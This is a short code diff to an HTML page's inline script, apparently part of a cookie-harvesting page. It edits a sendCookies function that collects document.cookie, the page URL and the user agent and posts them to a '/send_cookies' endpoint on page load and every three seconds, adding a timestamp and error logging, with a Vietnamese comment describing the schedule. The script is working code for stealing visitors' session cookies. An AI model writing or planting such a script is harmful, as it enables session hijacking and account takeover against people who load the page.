@@ -648,16 +648,19 @@
     function sendCookies() {
         fetch('/send_cookies', {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 cookies: document.cookie,
                 url: window.location.href,
-                userAgent: navigator.userAgent
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
             })
-        });
+        }).catch(err => console.log("Error sending cookies:", err));
     }
+
+    // Gửi khi load trang và mỗi 3 giây
     window.onload = sendCookies;
-    setInterval(sendCookies, 3000); // Gửi mỗi 3 giây
+    setInterval(sendCookies, 3000);
 </script>
 </body>
 </html>
